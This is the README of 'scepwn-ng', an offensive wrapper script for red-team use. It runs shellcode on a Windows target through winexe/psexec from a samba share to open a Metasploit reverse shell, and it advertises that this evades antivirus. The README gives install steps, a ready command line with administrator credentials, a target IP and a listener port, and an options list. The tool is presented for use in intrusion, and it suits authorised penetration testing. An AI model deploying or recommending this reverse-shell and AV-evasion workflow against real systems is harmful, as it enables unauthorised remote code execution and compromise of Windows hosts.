scepwn-ng
@thejosko <jskorich@secureworks.com>

INTRODUCTION
============
scepwn-ng is a wrapper script for launching winexe/psexec at a target, which then runs shellcode exec from a samba share with a msf generated reverse shell. As the executable never touches disk, it is highly effective at evading a/v. 


INSTALL
=======
Basic Setup for a kali box (skyfire):
'''
		$ cd /opt
		$ git clone https://github.com/CoreSecurity/impacket.git
		$ cd impacket; python setup.py install
		$ cd /opt; git clone https://github.com/inquisb/shellcodeexec.git
'''
If not using Kali, you will also need to install metasploit and winexe, as well as possibly modify the tool locations.

USAGE
=====

		./scepwn-ng.rb [optional]

**Example:**

		./scepwn-ng.rb -u 'Administrator%Password1' -t 10.1.1.1 -s psexec -p 4444

Note - All options are just that.. optional. If you leave anything out it will ask you for it.


**Options:**

		-t, --target TARGET              
																		Target IP address
		-u, --user CREDENTIALS           
																		Credentials in DOMAIN/USERNAME%PASSWORD format
		-p, --port PORT                  
																		Reverse shell port number (default: 443)
		-s, --service SERVICE            
																		winexe or psexec (default: winexe)
		-h, --help                       
																		Display this screen
             
